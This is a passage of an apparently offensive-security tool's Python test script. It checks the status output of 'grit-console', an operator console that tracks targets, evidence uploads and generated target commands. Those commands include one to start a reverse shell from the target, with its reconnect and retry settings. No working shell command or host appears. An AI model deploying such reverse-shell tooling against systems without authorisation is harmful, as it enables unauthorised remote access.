                "file_service_workflow_actions_by_fleet_mailbox_pending_work_count" not in ((action_doc.get("api_collections") or {}).get("file_service_workflow_actions") or {}).get("indexes", []) or
                "file_service_workflow_actions_by_fleet_has_mailbox_pending_work" not in ((action_doc.get("api_collections") or {}).get("file_service_workflow_actions") or {}).get("indexes", []) or
                "probe_workflow_actions_by_fleet_mailbox_pending_work_count" not in ((action_doc.get("api_collections") or {}).get("probe_workflow_actions") or {}).get("indexes", []) or
                "probe_workflow_actions_by_fleet_has_mailbox_pending_work" not in ((action_doc.get("api_collections") or {}).get("probe_workflow_actions") or {}).get("indexes", []) or
                "target_file_transfer_records_by_request_name" not in ((action_doc.get("api_collections") or {}).get("target_file_transfer_records") or {}).get("indexes", [])):
            print("target workflow actions did not mutate target-scoped queue/staged state", file=sys.stderr)
            print(json.dumps(action_doc, indent=2, sort_keys=True), file=sys.stderr)
            print(json.dumps(line_workbench_state, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        if (upload_doc.get("target_attribution", {}).get("upload_with_target_count") != 1 or
                upload_doc.get("target_attribution", {}).get("upload_without_target_count") != 0 or
                upload_doc.get("target_attribution_records_by_scope", {}).get("uploads", {}).get("all_activity_has_target_id") is not True or
                upload_doc.get("target_attribution_records_by_scope", {}).get("all", {}).get("has_targeted_activity") is not True or
                upload_doc.get("summary", {}).get("target_attribution_record_count") != 4 or
                "target_attribution_records_by_has_legacy_activity" not in ((upload_doc.get("api_collections") or {}).get("target_attribution_records") or {}).get("indexes", []) or
                upload_doc.get("summary", {}).get("upload_with_target_count") != 1 or
                upload_doc.get("summary", {}).get("target_legacy_single_target_activity_present") is not False):
            print("server json status missing attributed target activity counts", file=sys.stderr)
            print(upload_status_json.stdout, file=sys.stderr)
            return 1
        legacy_operator_dir = Path(tmp) / "operator-session-legacy-target"
        legacy_session_root = Path(tmp) / "sessions-legacy-target"
        legacy_session = legacy_session_root / "20260529-legacy-file-service"
        legacy_files = legacy_session / "files"
        legacy_files.mkdir(parents=True)
        legacy_payload = b"legacy single target upload\n"
        legacy_file = legacy_files / "legacy-evidence.txt"
        legacy_file.write_bytes(legacy_payload)
        legacy_sha = hashlib.sha256(legacy_payload).hexdigest()
        legacy_metadata = {
            "schema": 1,
            "operation": "upload",
            "status": "ok",
            "transfer_status": "ok",
            "upload_kind": "evidence",
            "source_path": "/tmp/legacy-evidence.txt",
            "stored_path": str(legacy_file),
            "filename": legacy_file.name,
            "size": len(legacy_payload),
            "expected_size": len(legacy_payload),
            "sha256": legacy_sha,
            "timestamp": "2026-05-29T00:00:00Z",
            "remote_addr": "127.0.0.1:44444",
        }
        (legacy_files / "legacy-evidence.txt.metadata.json").write_text(json.dumps(legacy_metadata), encoding="utf-8")
        (legacy_session / "session.json").write_text(json.dumps({
            "schema": 1,
            "session_id": legacy_session.name,
            "service": "file-service",
            "path": str(legacy_session),
            "state": "stopped",
            "exit_reason": "complete",
            "uploads": [legacy_metadata],
            "fetches": [],
            "artifacts": [],
        }), encoding="utf-8")
        legacy_cfg = Path(tmp) / "server-config-legacy-target.json"
        legacy_cfg.write_text(json.dumps({
            "operator_session_dir": str(legacy_operator_dir),
            "session_root": str(legacy_session_root),
            "listen_host": "127.0.0.1",
            "GRIT_OPERATOR_FILE_SERVICE_PORT": upload_port,
        }), encoding="utf-8")
        legacy_status = run(
            "scripts/grit-console",
            "--config", str(legacy_cfg),
            "--json-status",
        )
        legacy_doc = json.loads(legacy_status.stdout)
        if (legacy_doc.get("summary", {}).get("target_count") != 0 or
                legacy_doc.get("target_attribution", {}).get("upload_without_target_count") != 1 or
                legacy_doc.get("target_attribution", {}).get("session_without_target_count") != 1 or
                legacy_doc.get("target_attribution", {}).get("without_target_count") != 2 or
                legacy_doc.get("target_attribution", {}).get("legacy_single_target_activity_present") is not True or
                legacy_doc.get("summary", {}).get("upload_without_target_count") != 1 or
                legacy_doc.get("summary", {}).get("session_without_target_count") != 1 or
                legacy_doc.get("summary", {}).get("target_attribution_without_target_count") != 2 or
                legacy_doc.get("target_attribution_records_by_scope", {}).get("all", {}).get("has_legacy_activity") is not True or
                legacy_doc.get("target_attribution_records_by_scope", {}).get("uploads", {}).get("without_target_count") != 1 or
                legacy_doc.get("target_attribution_records_by_has_legacy_activity", {}).get("True", [{}])[0].get("scope") not in ("uploads", "sessions", "all") or
                legacy_doc.get("summary", {}).get("target_attribution_legacy_scope_count", 0) < 1 or
                legacy_doc.get("summary", {}).get("target_legacy_single_target_activity_present") is not True):
            print("legacy no-target activity was not summarized without creating a target", file=sys.stderr)
            print(legacy_status.stdout, file=sys.stderr)
            return 1
        legacy_text = run(
            "scripts/grit-console",
            "--config", str(legacy_cfg),
            "--status",
        )
        if ("target attribution: with=0 without=2 uploads_without=1" not in legacy_text.stdout or
                "legacy_single_target=yes" not in legacy_text.stdout):
            print("text status missing legacy no-target attribution summary", file=sys.stderr)
            print(legacy_text.stdout, file=sys.stderr)
            return 1
        session_close_key = f"{session_doc.get('session_id')}:connection_close"
        if (upload_event_stats.get("by_session_event", {}).get(session_close_key) != 1 or
                upload_summary.get("event_session_event_counts", {}).get(session_close_key) != 1 or
                upload_summary.get("event_service_event_counts", {}).get("file-service:upload_complete", 0) < 1 or
                upload_event_stats.get("by_event_detail_operation", {}).get("upload_complete:upload", 0) < 1 or
                upload_summary.get("event_type_detail_operation_counts", {}).get("upload_complete:upload", 0) < 1 or
                upload_event_stats.get("by_service_detail_http_status", {}).get("file-service:200", 0) < 1 or
                upload_summary.get("event_service_detail_http_status_counts", {}).get("file-service:200", 0) < 1):
            print("server json status missing full-log session/event aggregate counters", file=sys.stderr)
            print(upload_status_json.stdout, file=sys.stderr)
            return 1
        target_commands = upload_doc.get("target_commands") or []
        for expected_command in (
            "./grit survey push",
            "./grit reality-test push",
            "./grit manifest push",
            "./grit config-push",
            "./grit evidence push",
        ):
            if not any(expected_command in command for command in target_commands):
                print(f"server json status missing generated target command: {expected_command}", file=sys.stderr)
                print(upload_status_json.stdout, file=sys.stderr)
                return 1
        target_records = upload_doc.get("target_command_records") or []
        if not target_records or len(target_records) != len(target_commands):
            print("server json status missing structured target command records", file=sys.stderr)
            print(upload_status_json.stdout, file=sys.stderr)
            return 1
        if any(
            rec.get("side") != "target" or
            rec.get("requires_explicit_target_action") is not True or
            rec.get("executes_operator_supplied_commands") is not False
            for rec in target_records
        ):
            print("server target command records weakened the explicit-action safety boundary", file=sys.stderr)
            print(upload_status_json.stdout, file=sys.stderr)
            return 1
        target_summary = upload_doc.get("target_command_summary") or {}
        target_command_state = (upload_doc.get("target_command_state_records_by_id") or {}).get("target-commands") or {}
        if (target_summary.get("total_count") != len(target_records) or
                target_summary.get("target_count") != len(target_records) or
                target_summary.get("network_count") != len(target_records) or
                target_summary.get("explicit_target_action_count") != len(target_records) or
                target_summary.get("operator_supplied_command_execution_count") != 0 or
                target_summary.get("executes_operator_supplied_commands") is not False or
                target_summary.get("all_require_explicit_target_action") is not True or
                target_summary.get("by_side", {}).get("target") != len(target_records) or
                target_summary.get("by_purpose", {}).get("start the configured reverse shell transport from the target") != 1):
            print("server json status missing target command safety summary", file=sys.stderr)
            print(upload_status_json.stdout, file=sys.stderr)
            return 1
        upload_summary = upload_doc.get("summary", {})
        if (upload_summary.get("target_command_count") != len(target_records) or
                upload_summary.get("target_command_network_count") != len(target_records) or
                upload_summary.get("target_command_explicit_action_count") != len(target_records) or
                upload_summary.get("target_command_operator_supplied_execution_count") != 0 or
                upload_summary.get("target_command_copy_supported_count") != len(target_records) or
                upload_summary.get("target_command_state_record_count") != 1 or
                upload_summary.get("target_command_state_has_commands") is not True or
                upload_summary.get("target_command_state_has_network_commands") is not True or
                upload_summary.get("target_command_state_has_copy_supported_commands") is not True or
                upload_summary.get("target_command_state_has_operator_supplied_command_execution") is not False or
                upload_summary.get("target_command_state_safe_explicit_target_action_boundary") is not True or
                upload_summary.get("target_command_state_has_session_policy_errors") is not False or
                upload_summary.get("target_command_executes_operator_supplied_commands") is not False or
                upload_summary.get("target_command_all_require_explicit_target_action") is not True or
                upload_summary.get("target_command_side_counts", {}).get("target") != len(target_records) or
                upload_summary.get("target_command_purpose_counts", {}).get("start the configured reverse shell transport from the target") != 1):
            print("server json status missing aggregate target command safety counts", file=sys.stderr)
            print(upload_status_json.stdout, file=sys.stderr)
            return 1
        if (target_command_state.get("id") != "target-commands" or
                target_command_state.get("command_count") != len(target_records) or
                target_command_state.get("network_count") != len(target_records) or
                target_command_state.get("explicit_target_action_count") != len(target_records) or
                target_command_state.get("operator_supplied_command_execution_count") != 0 or
                target_command_state.get("has_commands") is not True or
                target_command_state.get("has_operator_supplied_command_execution") is not False or
                target_command_state.get("all_require_explicit_target_action") is not True or
                target_command_state.get("safe_explicit_target_action_boundary") is not True or
                upload_doc.get("target_command_state_records_by_safe_explicit_target_action_boundary", {}).get("True", [{}])[0].get("id") != "target-commands" or
                "target_command_state_records_by_has_operator_supplied_command_execution" not in ((upload_doc.get("api_collections") or {}).get("target_command_state_records") or {}).get("indexes", [])):
            print("server json status missing target command safety state record", file=sys.stderr)
            print(upload_status_json.stdout, file=sys.stderr)
            return 1
        target_commands_by_service = upload_doc.get("target_commands_by_service") or {}
        target_commands_by_side = upload_doc.get("target_commands_by_side") or {}
        target_commands_by_purpose = upload_doc.get("target_commands_by_purpose") or {}
        target_commands_by_service_purpose = upload_doc.get("target_commands_by_service_purpose") or {}
        target_commands_by_side_purpose = upload_doc.get("target_commands_by_side_purpose") or {}
        target_commands_by_network = upload_doc.get("target_commands_by_network") or {}
        target_commands_by_explicit_action = upload_doc.get("target_commands_by_requires_explicit_target_action") or {}
        target_commands_by_operator_supplied = upload_doc.get("target_commands_by_executes_operator_supplied_commands") or {}
        target_commands_by_ordinal = upload_doc.get("target_commands_by_ordinal") or {}
        target_commands_by_sha = upload_doc.get("target_commands_by_command_sha256") or {}
        target_commands_by_copy_supported = upload_doc.get("target_commands_by_copy_supported") or {}
        target_commands_by_session_policy = upload_doc.get("target_commands_by_session_policy") or {}
        target_commands_by_session_policy_valid = upload_doc.get("target_commands_by_session_policy_valid") or {}
        target_commands_by_retry_backoff = upload_doc.get("target_commands_by_retry_backoff") or {}
        target_commands_by_retry_interval = upload_doc.get("target_commands_by_retry_interval_sec") or {}
        target_commands_by_retry_post_disconnect = upload_doc.get("target_commands_by_retry_post_disconnect_count") or {}
        rshell_record = next((rec for rec in target_records if rec.get("service") == "rshell"), {})
        rshell_metadata = rshell_record.get("metadata") or {}
        rshell_semantics = rshell_metadata.get("session_semantics") or {}
        rshell_policy_summary = rshell_metadata.get("session_policy_summary") or {}
        rshell_retry = rshell_metadata.get("retry") or {}
        rshell_retry_timing = rshell_metadata.get("retry_timing") or {}
        rshell_policy_record = (upload_doc.get("rshell_session_policy_records_by_id") or {}).get("rshell") or {}
        rshell_purpose = "start the configured reverse shell transport from the target"
        if (len(target_commands_by_service.get("file-service") or []) < 6 or
                len(target_commands_by_side.get("target") or []) != len(target_records) or
                len(target_commands_by_purpose.get(rshell_purpose) or []) != 1 or
                len(target_commands_by_service_purpose.get(f"rshell:{rshell_purpose}") or []) != 1 or
                len(target_commands_by_side_purpose.get(f"target:{rshell_purpose}") or []) != 1 or
                len(target_commands_by_network.get("True") or []) != len(target_records) or
                len(target_commands_by_explicit_action.get("True") or []) != len(target_records) or
                target_commands_by_operator_supplied.get("True", []) != [] or
                len(target_commands_by_operator_supplied.get("False") or []) != len(target_records) or
                target_commands_by_ordinal.get("1", {}).get("copy_selector") != "1" or
                target_commands_by_ordinal.get("1", {}).get("command_sha256") not in target_commands_by_sha or
                len(target_commands_by_copy_supported.get("True") or []) != len(target_records) or
                "target_commands_by_executes_operator_supplied_commands" not in ((upload_doc.get("api_collections") or {}).get("target_command_records") or {}).get("indexes", []) or
                "target_commands_by_ordinal" not in ((upload_doc.get("api_collections") or {}).get("target_command_records") or {}).get("indexes", []) or
                "target_commands_by_command_sha256" not in ((upload_doc.get("api_collections") or {}).get("target_command_records") or {}).get("indexes", []) or
                "target_commands_by_copy_supported" not in ((upload_doc.get("api_collections") or {}).get("target_command_records") or {}).get("indexes", []) or
                "target_commands_by_retry_backoff" not in ((upload_doc.get("api_collections") or {}).get("target_command_records") or {}).get("indexes", []) or
                not rshell_record or
                target_commands_by_session_policy.get("reconnect", [{}])[0].get("service") != "rshell" or
                target_commands_by_session_policy_valid.get("True", [{}])[0].get("service") != "rshell" or
                target_commands_by_retry_backoff.get("linear", [{}])[0].get("service") != "rshell" or
                target_commands_by_retry_interval.get("3", [{}])[0].get("service") != "rshell" or
                target_commands_by_retry_post_disconnect.get("2", [{}])[0].get("service") != "rshell" or
                rshell_metadata.get("session_policy") != "reconnect" or
                rshell_metadata.get("session_policy_valid") is not True or
                rshell_metadata.get("session_policy_errors") != [] or
                rshell_semantics.get("reconnect_after_disconnect") is not True or
                rshell_semantics.get("fresh_session_on_reconnect") is not True or
                rshell_semantics.get("session_resume_supported") is not False or
                rshell_policy_summary.get("errors") != [] or
                rshell_policy_summary.get("retry_scope") != "pre-connect+post-disconnect" or
                rshell_policy_summary.get("pre_connect_retry_count") != "2" or
                rshell_policy_summary.get("post_disconnect_retry_count") != "2" or
                rshell_policy_summary.get("fresh_session_on_reconnect") is not True or
                rshell_policy_summary.get("session_resume_supported") is not False or
                rshell_retry.get("count") != "2" or
                rshell_retry.get("pre_connect_count") != "2" or
                rshell_retry.get("post_disconnect_count") != "2" or
                rshell_retry.get("interval_sec") != "3" or
                rshell_retry.get("jitter_pct") != "10" or
                rshell_retry.get("backoff") != "linear" or
                rshell_retry.get("max_interval_sec") != "8" or
                rshell_retry_timing.get("sample_delays_sec") != [3, 6, 8] or
                rshell_retry_timing.get("sample_delays_exclude_jitter") is not True or
                rshell_policy_record.get("session_policy") != "reconnect" or
                rshell_policy_record.get("session_policy_valid") is not True or
                rshell_policy_record.get("retry_scope") != "pre-connect+post-disconnect" or
                rshell_policy_record.get("pre_connect_retry_count") != "2" or
                rshell_policy_record.get("post_disconnect_retry_count") != "2" or
                rshell_policy_record.get("retry_backoff") != "linear" or
                rshell_policy_record.get("reconnects_after_disconnect") is not True or
                rshell_policy_record.get("session_resume_supported") is not False or
                upload_doc.get("rshell_session_policy_records_by_session_policy", {}).get("reconnect", [{}])[0].get("id") != "rshell" or
                upload_doc.get("rshell_session_policy_records_by_reconnects_after_disconnect", {}).get("True", [{}])[0].get("id") != "rshell" or
                "rshell_session_policy_records_by_persistent_lifecycle" not in ((upload_doc.get("api_collections") or {}).get("rshell_session_policy_records") or {}).get("indexes", []) or
                target_summary.get("by_service", {}).get("file-service", 0) < 6 or
                target_summary.get("by_service", {}).get("rshell") != 1 or
                target_summary.get("copy_supported_count") != len(target_records) or
                target_summary.get("by_session_policy", {}).get("reconnect") != 1 or
                target_summary.get("by_session_policy_valid", {}).get("True") != 1 or
                target_summary.get("session_policy_error_count") != 0 or
                target_summary.get("by_retry_backoff", {}).get("linear") != 1 or
                upload_summary.get("target_command_session_policy_counts", {}).get("reconnect") != 1 or
                upload_summary.get("target_command_session_policy_valid_counts", {}).get("True") != 1 or
                upload_summary.get("target_command_session_policy_error_count") != 0 or
                upload_summary.get("rshell_session_policy_record_count") != 1 or
                upload_summary.get("GRIT_RSHELL_SESSION_POLICY") != "reconnect" or
                upload_summary.get("rshell_session_policy_valid") is not True or
                upload_summary.get("rshell_session_policy_retry_scope") != "pre-connect+post-disconnect" or
                upload_summary.get("rshell_session_policy_reconnects_after_disconnect") is not True or
                upload_summary.get("target_command_retry_backoff_counts", {}).get("linear") != 1):
            print("server json status missing generated command service/session-policy lookup", file=sys.stderr)
            print(upload_status_json.stdout, file=sys.stderr)
            return 1
        if (upload_summary.get("upload_count", 0) < 1 or
                upload_summary.get("upload_total_size") != len(payload) or
                upload_summary.get("upload_stored_exists_count") != 1 or
                upload_summary.get("upload_stored_missing_count") != 0 or
                upload_summary.get("upload_kind_counts", {}).get("evidence") != 1 or
                upload_summary.get("upload_status_counts", {}).get("ok") != 1 or
                upload_summary.get("session_count", 0) < 1 or
                upload_summary.get("session_service_counts", {}).get("file-service") != 1 or
                upload_summary.get("session_state_counts", {}).get("stopped") != 1 or
                upload_summary.get("session_exit_reason_counts", {}).get("clean shutdown") != 1 or
                upload_summary.get("event_count", 0) < 1):
            print("server json status missing aggregate upload/session/event counts", file=sys.stderr)
            print(upload_status_json.stdout, file=sys.stderr)
            return 1
        upload_item = (upload_doc.get("uploads") or [{}])[0]
        if (upload_item.get("metadata_path") != str(metadata_path) or
                upload_item.get("stored_exists") is not True or
                upload_item.get("session_id") != session_json_paths[0].parent.name or
                upload_item.get("session_path") != str(session_json_paths[0].parent) or
                upload_item.get("metadata_exists") is not True or
                upload_item.get("event_log_exists") is not True or
                upload_item.get("event_log") != str(session_json_paths[0].parent / "events.jsonl") or
                upload_item.get("sha256_prefix") != metadata.get("sha256", "")[:12] or
                upload_item.get("upload_kind") != "evidence" or
                upload_item.get("target_id") != "target-alpha" or
                upload_item.get("target_label") != "Alpha Router" or
                upload_item.get("status") != "ok"):
            print("server json status missing upload browser metadata", file=sys.stderr)
            print(upload_status_json.stdout, file=sys.stderr)
            return 1
        uploads_by_session = upload_doc.get("uploads_by_session") or {}
        session_uploads = uploads_by_session.get(session_json_paths[0].parent.name) or []
        if (len(session_uploads) != 1 or
                session_uploads[0].get("metadata_path") != str(metadata_path) or
                session_uploads[0].get("stored_exists") is not True):
            print("server json status missing uploads_by_session browser grouping", file=sys.stderr)
            print(upload_status_json.stdout, file=sys.stderr)
            return 1
        uploads_by_filename = upload_doc.get("uploads_by_filename") or {}
        uploads_by_kind = upload_doc.get("uploads_by_kind") or {}
        uploads_by_sha = upload_doc.get("uploads_by_sha256") or {}
        uploads_by_target = upload_doc.get("uploads_by_target_id") or {}
        uploads_by_source = upload_doc.get("uploads_by_source_path") or {}
        uploads_by_stored = upload_doc.get("uploads_by_stored_path") or {}
        uploads_by_stored_exists = upload_doc.get("uploads_by_stored_exists") or {}
        uploads_by_metadata_exists = upload_doc.get("uploads_by_metadata_exists") or {}
        uploads_by_event_log_exists = upload_doc.get("uploads_by_event_log_exists") or {}
        uploads_by_remote = upload_doc.get("uploads_by_remote_addr") or {}
        uploads_by_status = upload_doc.get("uploads_by_status") or {}
        uploads_by_kind_status = upload_doc.get("uploads_by_kind_status") or {}
        uploads_by_filename_status = upload_doc.get("uploads_by_filename_status") or {}
        uploads_by_status_stored_exists = upload_doc.get("uploads_by_status_stored_exists") or {}
        uploads_by_status_remote = upload_doc.get("uploads_by_status_remote_addr") or {}
        upload_remote = upload_item.get("remote_addr", "")
        upload_filename_status_key = "evidence.txt:ok"
        upload_kind_status_key = "evidence:ok"
        upload_status_stored_exists_key = "ok:yes"
        upload_status_remote_key = f"ok:{upload_remote}"
        if (uploads_by_filename.get("evidence.txt", [{}])[0].get("metadata_path") != str(metadata_path) or
                uploads_by_kind.get("evidence", [{}])[0].get("filename") != "evidence.txt" or
                uploads_by_sha.get(metadata.get("sha256"), [{}])[0].get("filename") != "evidence.txt" or
                uploads_by_target.get("target-alpha", [{}])[0].get("filename") != "evidence.txt" or
                uploads_by_source.get("/tmp/evidence.txt", [{}])[0].get("stored_path") != str(uploaded[0]) or
                uploads_by_stored.get(str(uploaded[0]), {}).get("source_path") != "/tmp/evidence.txt" or
                uploads_by_stored_exists.get("yes", [{}])[0].get("filename") != "evidence.txt" or
                uploads_by_metadata_exists.get("yes", [{}])[0].get("filename") != "evidence.txt" or
                uploads_by_event_log_exists.get("yes", [{}])[0].get("filename") != "evidence.txt" or
                uploads_by_status.get("ok", [{}])[0].get("filename") != "evidence.txt" or
                not upload_remote or
                uploads_by_remote.get(upload_remote, [{}])[0].get("filename") != "evidence.txt" or
                uploads_by_kind_status.get(upload_kind_status_key, [{}])[0].get("stored_path") != str(uploaded[0]) or
                uploads_by_filename_status.get(upload_filename_status_key, [{}])[0].get("stored_path") != str(uploaded[0]) or
                uploads_by_status_stored_exists.get(upload_status_stored_exists_key, [{}])[0].get("filename") != "evidence.txt" or
                uploads_by_status_remote.get(upload_status_remote_key, [{}])[0].get("filename") != "evidence.txt"):
            print("server json status missing upload browser lookup maps", file=sys.stderr)
            print(upload_status_json.stdout, file=sys.stderr)
            return 1
        if (upload_summary.get("upload_remote_counts", {}).get(upload_remote) != 1 or
                upload_summary.get("upload_target_counts", {}).get("target-alpha") != 1 or
                upload_summary.get("upload_metadata_exists_counts", {}).get("yes") != 1 or
                upload_summary.get("upload_event_log_exists_counts", {}).get("yes") != 1 or
                upload_summary.get("upload_kind_status_counts", {}).get(upload_kind_status_key) != 1 or
                upload_summary.get("upload_filename_status_counts", {}).get(upload_filename_status_key) != 1 or
                upload_summary.get("upload_status_stored_exists_counts", {}).get(upload_status_stored_exists_key) != 1 or
                upload_summary.get("upload_status_remote_counts", {}).get(upload_status_remote_key) != 1 or
                upload_summary.get("session_remote_counts", {}).get(upload_remote) != 1):
            print("server json status missing upload/session remote summary counts", file=sys.stderr)
            print(upload_status_json.stdout, file=sys.stderr)
            return 1
        upload_api = (upload_doc.get("api_collections") or {}).get("uploads") or {}
        if ("uploads_by_metadata_exists" not in (upload_api.get("indexes") or []) or
                "uploads_by_event_log_exists" not in (upload_api.get("indexes") or []) or
                "uploads_by_target_id" not in (upload_api.get("indexes") or [])):
            print("server json status missing upload metadata/log availability API indexes", file=sys.stderr)
            print(upload_status_json.stdout, file=sys.stderr)
            return 1
        if (upload_summary.get("latest_upload_at") != upload_item.get("timestamp") or
                upload_summary.get("latest_session_updated_at") != upload_doc.get("sessions", [{}])[0].get("updated_at")):
            print("server json status missing upload/session recency summary", file=sys.stderr)
            print(upload_status_json.stdout, file=sys.stderr)
            return 1
        upload_browser_by_kind = upload_doc.get("browser_paths_by_kind") or {}
        upload_browser_by_path = upload_doc.get("browser_paths_by_path") or {}
        upload_browser_by_source = upload_doc.get("browser_paths_by_source_id") or {}
        upload_browser_by_kind_source = upload_doc.get("browser_paths_by_kind_source_id") or {}
        upload_session_id = session_json_paths[0].parent.name
        if (upload_doc.get("browser_path_summary", {}).get("by_kind", {}).get("upload-stored") != 1 or
                upload_doc.get("browser_path_summary", {}).get("exists_by_kind", {}).get("upload-stored") != 1 or
                upload_summary.get("browser_path_kind_counts", {}).get("upload-metadata") != 1 or
                upload_summary.get("browser_path_exists_kind_counts", {}).get("upload-stored") != 1 or
                upload_summary.get("browser_path_missing_kind_counts", {}).get("staged-ledger") != 1 or
                upload_browser_by_kind.get("upload-stored", [{}])[0].get("path") != str(uploaded[0]) or
                upload_browser_by_path.get(str(metadata_path), [{}])[0].get("kind") != "upload-metadata" or
                not upload_browser_by_source.get(upload_session_id) or
                upload_browser_by_kind_source.get(f"upload-metadata:{upload_session_id}", [{}])[0].get("path") != str(metadata_path) or
                upload_browser_by_kind_source.get(f"session-dir:{upload_session_id}", [{}])[0].get("path") != str(session_json_paths[0].parent)):
            print("server json status missing upload/session browser path records", file=sys.stderr)
            print(upload_status_json.stdout, file=sys.stderr)
            return 1
        upload_session = (upload_doc.get("sessions") or [{}])[0]
        session_root_state = upload_doc.get("session_root_state") or {}
        if (upload_session.get("upload_count") != 1 or
                upload_session.get("event_count", 0) < 1 or
                upload_session.get("fetch_count") != 0 or
                upload_session.get("has_uploads") is not True or
                upload_session.get("has_fetches") is not False or
                upload_session.get("has_events") is not True or
                upload_session.get("has_session_log") is not True or
                upload_session.get("metadata_exists") is not True or
                upload_session.get("event_log_exists") is not True or
                upload_session.get("session_log_exists") is not True or
                upload_session.get("session_log") != str(session_log_path) or
                upload_session.get("session_log_size") != len(session_log_text.encode("utf-8")) or
                upload_session.get("session_log_line_count") != 2 or
                not isinstance(upload_session.get("duration_sec"), int) or
                upload_session.get("metadata_path") != str(session_json_paths[0]) or
                upload_session.get("event_log") != str(session_json_paths[0].parent / "events.jsonl")):
            print("server json status missing session browser counts and paths", file=sys.stderr)
            print(upload_status_json.stdout, file=sys.stderr)
            return 1
        if (session_root_state.get("path") != str(session_root) or
                session_root_state.get("exists") is not True or
                session_root_state.get("recent_session_count") != 1 or
                session_root_state.get("has_recent_sessions") is not True or
                session_root_state.get("has_uploads") is not True or
                session_root_state.get("has_fetches") is not False or
                session_root_state.get("has_events") is not True or
                session_root_state.get("recent_session_ids") != [session_json_paths[0].parent.name] or
                session_root_state.get("service_counts", {}).get("file-service") != 1 or
                session_root_state.get("total_upload_count") != 1 or
                session_root_state.get("total_fetch_count") != 0 or
                session_root_state.get("total_event_count", 0) < 1 or
                session_root_state.get("total_session_log_size") != len(session_log_text.encode("utf-8")) or
                session_root_state.get("total_session_log_line_count") != 2 or
                session_root_state.get("duration_known_count") != 1 or
                session_root_state.get("total_duration_sec", -1) < 0 or
                session_root_state.get("max_duration_sec", -1) < 0 or
                session_root_state.get("sessions_with_uploads_count") != 1 or
                session_root_state.get("sessions_with_fetches_count") != 0 or
                session_root_state.get("sessions_with_events_count") != 1 or
                session_root_state.get("sessions_with_session_logs_count") != 1 or
                session_root_state.get("sessions_with_metadata_count") != 1 or
                session_root_state.get("sessions_with_event_logs_count") != 1 or
                upload_doc.get("session_root_state_records_by_path", {}).get(str(session_root), {}).get("recent_session_count") != 1 or
                upload_doc.get("session_root_state_records_by_has_recent_sessions", {}).get("True", [{}])[0].get("path") != str(session_root) or
                upload_doc.get("session_root_state_records_by_has_uploads", {}).get("True", [{}])[0].get("path") != str(session_root) or
                upload_doc.get("session_root_state_records_by_has_fetches", {}).get("False", [{}])[0].get("path") != str(session_root) or
                "session_root_state_records_by_has_events" not in ((upload_doc.get("api_collections") or {}).get("session_root_state_records") or {}).get("indexes", []) or
                upload_summary.get("session_root_exists") is not True or
                upload_summary.get("session_root_recent_count") != 1 or
                upload_summary.get("session_root_state_record_count") != 1 or
                upload_summary.get("session_root_has_recent_sessions") is not True or
                upload_summary.get("session_total_upload_count") != 1 or
                upload_summary.get("session_total_fetch_count") != 0 or
                upload_summary.get("session_total_event_count", 0) < 1 or
                upload_summary.get("session_total_log_size") != len(session_log_text.encode("utf-8")) or
                upload_summary.get("session_total_log_line_count") != 2 or
                upload_summary.get("session_duration_known_count") != 1 or
                upload_summary.get("session_total_duration_sec", -1) < 0 or
                upload_summary.get("session_average_duration_sec", -1) < 0 or
                upload_summary.get("session_max_duration_sec", -1) < 0 or
                upload_summary.get("sessions_with_uploads_count") != 1 or
                upload_summary.get("sessions_with_fetches_count") != 0 or
                upload_summary.get("sessions_with_events_count") != 1 or
                upload_summary.get("sessions_with_session_logs_count") != 1 or
                upload_summary.get("sessions_with_metadata_count") != 1 or
                upload_summary.get("sessions_with_event_logs_count") != 1):
            print("server json status missing session root browser state", file=sys.stderr)
            print(upload_status_json.stdout, file=sys.stderr)
            return 1
        sessions_by_id = upload_doc.get("sessions_by_id") or {}
        sessions_by_service = upload_doc.get("sessions_by_service") or {}
        sessions_by_state = upload_doc.get("sessions_by_state") or {}
        sessions_by_exit_reason = upload_doc.get("sessions_by_exit_reason") or {}
        sessions_by_remote = upload_doc.get("sessions_by_remote") or {}
        sessions_by_service_state = upload_doc.get("sessions_by_service_state") or {}
        sessions_by_service_exit_reason = upload_doc.get("sessions_by_service_exit_reason") or {}
        sessions_by_service_remote = upload_doc.get("sessions_by_service_remote") or {}
        sessions_by_target_id = upload_doc.get("sessions_by_target_id") or {}
        sessions_by_has_uploads = upload_doc.get("sessions_by_has_uploads") or {}
        sessions_by_has_fetches = upload_doc.get("sessions_by_has_fetches") or {}
        sessions_by_has_events = upload_doc.get("sessions_by_has_events") or {}
        sessions_by_duration_known = upload_doc.get("sessions_by_duration_known") or {}
        sessions_by_has_session_log = upload_doc.get("sessions_by_has_session_log") or {}
        sessions_by_metadata_exists = upload_doc.get("sessions_by_metadata_exists") or {}
        sessions_by_event_log_exists = upload_doc.get("sessions_by_event_log_exists") or {}
        sessions_by_session_log_exists = upload_doc.get("sessions_by_session_log_exists") or {}
        events_by_session = upload_doc.get("events_by_session") or {}
        events_by_session_event = upload_doc.get("events_by_session_event") or {}
        upload_events_by_service_event = upload_doc.get("events_by_service_event") or {}
        upload_events_by_detail_status = upload_doc.get("events_by_detail_status") or {}
        upload_events_by_detail_operation = upload_doc.get("events_by_detail_operation") or {}
        upload_events_by_detail_http_status = upload_doc.get("events_by_detail_http_status") or {}
        upload_events_by_detail_filename = upload_doc.get("events_by_detail_filename") or {}
        upload_events_by_detail_sha256 = upload_doc.get("events_by_detail_sha256") or {}
        upload_events_by_event_detail_status = upload_doc.get("events_by_event_detail_status") or {}
        upload_events_by_service_detail_status = upload_doc.get("events_by_service_detail_status") or {}
        upload_events_by_event_detail_operation = upload_doc.get("events_by_event_detail_operation") or {}
        upload_events_by_service_detail_operation = upload_doc.get("events_by_service_detail_operation") or {}
        upload_events_by_event_detail_http_status = upload_doc.get("events_by_event_detail_http_status") or {}
        upload_events_by_service_detail_http_status = upload_doc.get("events_by_service_detail_http_status") or {}
        upload_events_by_event_detail_filename = upload_doc.get("events_by_event_detail_filename") or {}
        upload_events_by_service_detail_filename = upload_doc.get("events_by_service_detail_filename") or {}
        upload_events_by_event_detail_sha256 = upload_doc.get("events_by_event_detail_sha256") or {}
        upload_events_by_service_detail_sha256 = upload_doc.get("events_by_service_detail_sha256") or {}
        upload_events_api = (upload_doc.get("api_collections") or {}).get("events") or {}
        uploaded_session_id = session_json_paths[0].parent.name
        session_service_state_key = "file-service:stopped"
        session_service_exit_key = "file-service:clean shutdown"
        session_service_remote_key = f"file-service:{upload_remote}"
        if (sessions_by_id.get(uploaded_session_id, {}).get("metadata_path") != str(session_json_paths[0]) or
                not sessions_by_service.get("file-service") or
                sessions_by_service["file-service"][0].get("session_id") != uploaded_session_id or
